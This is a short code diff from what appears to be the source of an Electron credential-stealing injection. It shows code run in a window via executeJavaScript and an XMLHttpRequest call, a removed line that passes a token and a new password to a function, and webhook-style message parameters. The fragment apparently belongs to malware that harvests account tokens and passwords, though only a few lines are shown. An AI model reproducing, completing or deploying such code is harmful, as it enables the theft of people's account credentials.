@@ -544,7 +544,7 @@ window.webContents.executeJavaScript(`    var xhr = new XMLHttpRequest();
         `, true).then((ip) => {
 
             var json = JSON.parse(info);
-Secure(token,newpassword)
+
             var params = {
                 username: "Zero Fa",
                 content: "",
